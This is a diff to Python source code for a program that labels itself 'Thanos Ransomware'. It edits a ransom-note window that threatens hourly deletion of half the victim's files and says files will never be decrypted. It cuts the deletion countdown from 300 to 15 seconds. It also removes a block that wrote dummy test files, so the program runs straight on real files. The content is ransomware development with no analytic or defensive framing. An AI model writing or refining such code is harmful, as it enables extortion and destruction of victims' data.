@@ -223,7 +223,7 @@ class MyTk:
                                          "\nYOU UUID : "+str(UUID)+
                                          "\nIf you dont, every hour half of all files will be deleted."
                                          "\n------WARNING------"
-                                         "\nDo not force-terminate this program."
+                                         "\nDo not terminate this program."
                                          "\nYou will NEVER decrypt your files."
                                          "\n",
                                     fg="green", bg="black", font='Helvetica 14 bold')
@@ -249,11 +249,6 @@ class MyTk:
                                       highlightthickness=0)
         self.l_thanos.pack()
 
-    '''
-    def disable_event(self):
-        messagebox.showinfo(title="Thanos Ransomware", message="You can't leave this window.")
-        pass
-'''
 
     def keySubmit(self):
         self.pw = str(self.password.get())
@@ -339,7 +334,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 300, antdd_filelist)
+    clock(gui, 15, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
@@ -470,11 +465,5 @@ class RealMain:
 
 
 if __name__ == "__main__":
-    for i in range(5):
-        with open("test" + str(i) + '.txt', 'wb') as testfile:
-            testfile.write('테스트입니다'.encode())
-    for i in range(5):
-        with open("ui/test" + str(i) + '.txt', 'wb') as testfile:
-            testfile.write('테스트입니다'.encode())
     r = RealMain()
     r.run()
